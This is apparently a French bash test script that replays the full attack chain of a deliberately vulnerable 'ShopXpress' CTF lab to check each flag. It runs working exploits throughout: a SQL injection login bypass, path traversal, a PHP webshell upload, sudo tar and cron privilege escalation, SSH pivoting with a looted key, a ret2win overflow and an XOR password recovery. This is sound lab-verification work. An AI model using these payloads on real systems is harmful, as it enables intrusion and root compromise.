#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# verify-chain.sh — test fonctionnel de TOUTE la chaîne d'attaque « ShopXpress »,
# machine par machine (web → files → admin). Rejoue chaque catégorie de challenge
# et vérifie le FLAG_* correspondant. Complémentaire de verify-firewall.sh.
#
# Catégories : Web (SQLi auth bypass · path traversal · upload PHP RCE) · Privesc
# (sudo GTFOBins, cron world-writable) · Recon SMB · Forensique (pcap) · Stégano ·
# Crypto (MD5/rockyou) · Pivot (clé SSH) · Pwn (BOF ret2win) · Reverse (XOR).
#
# ⚠️ DESTRUCTIF : exécute réellement les exploits (upload d'un webshell, injection
# dans le cron, shells root, etc.). Lancer sur un lab jetable ; `make up` réinit.
# ─────────────────────────────────────────────────────────────────────────────
set -u
ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
[ -f "$ROOT_DIR/.env" ] && { set -a; . "$ROOT_DIR/.env"; set +a; }

if docker compose version >/dev/null 2>&1; then DC=(docker compose); else DC=(docker-compose); fi
dc(){ "${DC[@]}" -f "$ROOT_DIR/docker-compose.yml" "$@"; }

WEB="$(dc ps -q web 2>/dev/null)";   FILES="$(dc ps -q files 2>/dev/null)"
WS="$(dc ps -q workstation 2>/dev/null)"
P="$(basename "$ROOT_DIR")"
: "${WEB:=${P}_web_1}" "${FILES:=${P}_files_1}" "${WS:=${P}_workstation_1}"

WORKSTATION_LAN_IP="${WORKSTATION_LAN_IP:-172.31.20.12}"
S_MOREL_PW="${S_MOREL_PW:-superman}"
ADMIN_MASTER_PW="${ADMIN_MASTER_PW:-ShopXpress-Adm-2024}"
B="http://127.0.0.1:${WEB_PUBLISH_PORT:-8080}"

PASS=0; FAIL=0
ok(){ printf '  \033[32m[ OK ]\033[0m %s\n' "$1"; PASS=$((PASS+1)); }
ko(){ printf '  \033[31m[FAIL]\033[0m %s\n' "$1"; FAIL=$((FAIL+1)); }
h(){ printf '\n\033[1m%s\033[0m\n' "$1"; }

ws_flag(){ docker exec "$1" printenv "$2" 2>/dev/null; }
F_WEB_RCE="$(ws_flag "$WEB" FLAG_WEB_RCE)";         : "${F_WEB_RCE:=${FLAG_WEB_RCE:-}}"
F_WEB_REVERSE="$(ws_flag "$WEB" FLAG_WEB_REVERSE)"; : "${F_WEB_REVERSE:=${FLAG_WEB_REVERSE:-}}"
F_WEB_ROOT="$(ws_flag "$WEB" FLAG_WEB_ROOT)";       : "${F_WEB_ROOT:=${FLAG_WEB_ROOT:-}}"
F_FILES_RECON="$(ws_flag "$FILES" FLAG_FILES_RECON)"; : "${F_FILES_RECON:=${FLAG_FILES_RECON:-}}"
F_DB_PIVOT="$(ws_flag "$FILES" FLAG_DB_PIVOT)";     : "${F_DB_PIVOT:=${FLAG_DB_PIVOT:-}}"
F_DB_ROOT="$(ws_flag "$FILES" FLAG_DB_ROOT)";       : "${F_DB_ROOT:=${FLAG_DB_ROOT:-}}"
F_FILES_RCE="$(ws_flag "$FILES" FLAG_FILES_RCE)";   : "${F_FILES_RCE:=${FLAG_FILES_RCE:-}}"
F_FILES_ROOT="$(ws_flag "$FILES" FLAG_FILES_ROOT)"; : "${F_FILES_ROOT:=${FLAG_FILES_ROOT:-}}"
F_WS_ROOT="$(ws_flag "$WS" FLAG_WS_ROOT)";          : "${F_WS_ROOT:=${FLAG_WS_ROOT:-}}"
F_FINAL="$(ws_flag "$WS" FLAG_FINAL)";              : "${F_FINAL:=${FLAG_FINAL:-}}"

# ══ WEB ══════════════════════════════════════════════════════════════════════
h "WEB (DMZ) — boutique ShopXpress : SQLi auth bypass · path traversal · upload RCE · privesc"

[ "$(curl -s -o /dev/null -w '%{http_code}' "$B/")" = 200 ] \
  && ok "boutique ShopXpress en ligne (accueil 200)" || ko "site KO"

# [Vuln 1 — SQLi] auth bypass sur /connexion.php → session gérant (porte vers l'upload)
J=/tmp/vc_jar; J2=/tmp/vc_jar2; rm -f $J $J2
curl -s -c $J --data-urlencode "user=admin'--" --data-urlencode "pass=x" "$B/connexion.php" -o /dev/null
curl -s -b $J "$B/admin/index.php" | grep -qi 'back-office\|gérant\|gerant\|déconnexion\|deconnexion' \
  && ok "SQLi (admin'--) → session gérant, back-office accessible" || ko "SQLi auth bypass KO"
# contrôle négatif : sans injection, identifiants faux → pas d'accès
curl -s -c $J2 --data-urlencode "user=admin" --data-urlencode "pass=wrong" "$B/connexion.php" -o /dev/null
curl -s -b $J2 "$B/admin/index.php" | grep -qi 'back-office' \
  && ko "back-office accessible SANS SQLi (auth cassée!)" || ok "auth requise hors SQLi (pas de bypass trivial)"

# [Vuln 2 — Path traversal] /telecharger.php → lecture de fichiers hors docroot
TRAV="$(curl -s "$B/telecharger.php?facture=../../private/rapport-ventes.txt")"
echo "$TRAV" | grep -qF "$F_WEB_REVERSE" \
  && ok "path traversal → FLAG_WEB_REVERSE (rapport-ventes.txt hors docroot)" || ko "path traversal (flag) KO"
curl -s "$B/telecharger.php?facture=../../../../etc/passwd" | grep -q '^root:' \
  && ok "path traversal lit aussi /etc/passwd" || ko "traversal /etc/passwd KO"
CFG="$(curl -s "$B/telecharger.php?facture=../config/config.php")"
B64="$(echo "$CFG" | grep -oE "'[A-Za-z0-9+/=]{8,}'" | tr -d "'" | head -1)"
DEC="$(printf '%s' "$B64" | base64 -d 2>/dev/null)"
[ "$DEC" = "s.morel:${S_MOREL_PW}" ] \
  && ok "config.php fuite via traversal → base64 décodé = ${DEC} (encodage ≠ chiffrement)" \
  || ko "fuite creds base64 KO (obtenu: '${DEC}')"

# [Vuln 3 — Upload PHP RCE] dépôt d'un webshell (session gérant) → www-data
# Le flag RCE est dans l'ENV du serveur (gate par EXÉCUTION) → on l'obtient en
# EXÉCUTANT `printenv` via le webshell (pas par lecture de fichier).
printf '<?php system($_GET["cmd"]); ?>' > /tmp/vc_shell.php
curl -s -b $J -F "image=@/tmp/vc_shell.php" "$B/admin/upload.php" -o /dev/null
RCE="$(curl -s "$B/uploads/vc_shell.php" --get --data-urlencode 'cmd=id; printenv FLAG_WEB_RCE')"
echo "$RCE" | grep -q 'uid=33(www-data)' \
  && ok "upload PHP non filtré → webshell exécuté (www-data)" || ko "upload RCE KO (pas de webshell)"
echo "$RCE" | grep -qF "$F_WEB_RCE" \
  && ok "FLAG_WEB_RCE obtenu par EXÉCUTION (env du serveur, foothold www-data)" || ko "FLAG_WEB_RCE non obtenu"
# Gate : la path traversal (lecture) NE doit PAS donner le flag RCE (indice seulement)
curl -s "$B/telecharger.php?facture=../../flag_user.txt" | grep -qF "$F_WEB_RCE" \
  && ko "path traversal lit le flag RCE (raccourci lecture vs exécution!)" \
  || ok "traversal → indice seulement, pas le flag RCE (gate exécution OK)"
# Gate : le webshell www-data NE doit PAS pouvoir printenv le flag ROOT (privesc non sautable)
curl -s "$B/uploads/vc_shell.php" --get --data-urlencode 'cmd=printenv FLAG_WEB_ROOT' | grep -qF "$F_WEB_ROOT" \
  && ko "webshell printenv FLAG_WEB_ROOT (privesc contournée via l'env!)" \
  || ok "FLAG_WEB_ROOT/REVERSE absents de l'env serveur (privesc/traversal requis)"

# [Privesc] www-data ne lit pas /root ; sudo tar GTFOBins → root
docker exec -u www-data "$WEB" cat /root/flag_root.txt >/dev/null 2>&1 \
  && ko "www-data lit /root/flag_root (perms cassées!)" || ok "www-data ne lit pas /root/flag_root"
WROOT="$(docker exec -u www-data "$WEB" sh -c \
  'sudo -n tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="sh -c \"id; cat /root/flag_root.txt\"" 2>/dev/null')"
echo "$WROOT" | grep -q 'uid=0(root)' \
  && ok "sudo tar GTFOBins (NOPASSWD) : www-data → root" || ko "sudo tar GTFOBins KO"
echo "$WROOT" | grep -qF "$F_WEB_ROOT" \
  && ok "FLAG_WEB_ROOT lu en root sur web" || ko "FLAG_WEB_ROOT non lu"
rm -f /tmp/vc_shell.php $J $J2

# ══ FILES ════════════════════════════════════════════════════════════════════
h "FILES (LAN, via pivot) — Recon SMB / Forensique / Stégano / Crypto / Privesc"

docker exec "$FILES" sh -c 'rm -f /tmp/vc_note; smbclient -N //127.0.0.1/public -c "get note-interne.txt /tmp/vc_note" >/dev/null 2>&1'
docker exec "$FILES" sh -c 'cat /tmp/vc_note 2>/dev/null; rm -f /tmp/vc_note' | grep -qF "$F_FILES_RECON" \
  && ok "SMB anonyme (//public) → FLAG_FILES_RECON (recon)" || ko "SMB anonyme KO (recon)"

docker exec "$FILES" sh -c 'strings /srv/public/capture.pcap 2>/dev/null' | grep -qF "$F_DB_PIVOT" \
  && ok "pcap en clair (strings/tshark) → FLAG_DB_PIVOT (forensique)" || ko "pcap forensique KO"

docker exec "$FILES" sh -c 'strings /srv/public/photo-produit.jpg 2>/dev/null' | grep -qF "$F_DB_ROOT" \
  && ok "stégano image (strings/binwalk) → FLAG_DB_ROOT" || ko "stégano KO"

MD5="$(printf '%s' "$S_MOREL_PW" | md5sum | cut -d' ' -f1)"
docker exec "$FILES" sh -c 'cat /srv/public/backup/hashes.txt 2>/dev/null' | grep -q "s.morel:${MD5}" \
  && ok "hash MD5 s.morel = md5(${S_MOREL_PW}) (crackable rockyou)" || ko "hash MD5 s.morel absent/incohérent"
docker exec "$FILES" su s.morel -c 'cat /srv/stock/flag_acces.txt' 2>/dev/null | grep -qF "$F_FILES_RCE" \
  && ok "compte s.morel (mdp craqué) lit /srv/stock → FLAG_FILES_RCE" || ko "accès STOCK s.morel KO"

PERMS="$(docker exec "$FILES" stat -c '%a' /opt/shopxpress/maintenance.sh 2>/dev/null)"
case "$PERMS" in
  *[2367]) ok "maintenance.sh world-writable (perms ${PERMS}) — exécuté par cron root" ;;
  *) ko "maintenance.sh PAS world-writable (perms ${PERMS})" ;;
esac
docker exec "$FILES" sh -c 'cp -p /opt/shopxpress/maintenance.sh /tmp/vc_maint.bak'
docker exec -u s.morel "$FILES" sh -c 'printf "\ncat /root/flag_root.txt > /tmp/vc_cron.txt 2>&1; chmod 644 /tmp/vc_cron.txt\n" >> /opt/shopxpress/maintenance.sh'
docker exec "$FILES" sh -c 'rm -f /tmp/vc_cron.txt; /bin/sh /opt/shopxpress/maintenance.sh >/dev/null 2>&1'   # = ce que fait cron (root)
docker exec "$FILES" sh -c 'cat /tmp/vc_cron.txt 2>/dev/null' | grep -qF "$F_FILES_ROOT" \
  && ok "cron root + script world-writable → FLAG_FILES_ROOT (privesc)" || ko "privesc cron KO"
docker exec "$FILES" sh -c 'mv /tmp/vc_maint.bak /opt/shopxpress/maintenance.sh; chmod 666 /opt/shopxpress/maintenance.sh; rm -f /tmp/vc_cron.txt'

docker exec "$FILES" test -f /root/id_admin \
  && ok "clé SSH j.martin lootée sur files (/root/id_admin)" || ko "clé SSH admin absente (gate cassée)"

# ══ ADMIN (workstation) ══════════════════════════════════════════════════════
h "ADMIN (LAN, via clé SSH) — Pivot / Pwn / Reverse / FINAL"

SSHID="$(docker exec "$FILES" sh -c "ssh -i /root/id_admin -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 j.martin@${WORKSTATION_LAN_IP} 'id' 2>/dev/null")"
echo "$SSHID" | grep -q 'j.martin' \
  && ok "rebond SSH (clé lootée) files → admin = j.martin" || ko "rebond SSH vers admin KO"

docker cp "$WS":/usr/local/bin/vault /tmp/vc_vault >/dev/null 2>&1
WIN="$(objdump -d /tmp/vc_vault 2>/dev/null | awk '/<win>:/{print "0x"$1; exit}')"
rm -f /tmp/vc_vault
[ -n "$WIN" ] || WIN="0x401196"
WSROOT="$( { python3 -c "import sys;sys.stdout.buffer.write(b'A'*72+(${WIN}).to_bytes(8,'little'))"; sleep 1; \
            printf 'id; cat /root/flag_root.txt\n'; sleep 1; } \
          | docker exec -i -u j.martin "$WS" /usr/local/bin/vault 2>/dev/null )"
echo "$WSROOT" | grep -q 'uid=0(root)' \
  && ok "BOF ret2win sur vault (win=${WIN}, offset 72) : j.martin → root" || ko "BOF vault KO (pas de root)"
echo "$WSROOT" | grep -qF "$F_WS_ROOT" \
  && ok "FLAG_WS_ROOT lu en root sur admin (pwn)" || ko "FLAG_WS_ROOT non lu"

# [Reverse] dé-XOR de backoffice-check → mot de passe maître → trophée FINAL
MASTER="$(python3 -c "
enc=[0x08,0x33,0x34,0x2b,0x03,0x2b,0x29,0x3e,0x28,0x28,0x76,0x1a,0x3f,0x36,0x76,0x69,0x6b,0x69,0x6f]
print(''.join(chr(b^0x5b) for b in enc))")"
[ "$MASTER" = "$ADMIN_MASTER_PW" ] \
  && ok "reverse XOR (enc ^ 0x5b) → mot de passe maître « ${MASTER} »" \
  || ko "reverse XOR KO (obtenu: '${MASTER}')"
FINAL="$(printf '%s\n' "$MASTER" | docker exec -i -u j.martin "$WS" /usr/local/bin/backoffice-check 2>/dev/null)"
echo "$FINAL" | grep -qF "$F_FINAL" \
  && ok "backoffice-check (SUID) + mdp maître → FLAG_FINAL (accès back-office)" || ko "FLAG_FINAL KO"

# ══ BILAN ════════════════════════════════════════════════════════════════════
h "Bilan chaîne ShopXpress : ${PASS} OK / ${FAIL} FAIL"
[ "$FAIL" -eq 0 ] && echo "Toute la chaîne d'attaque ShopXpress est fonctionnelle." || exit 1
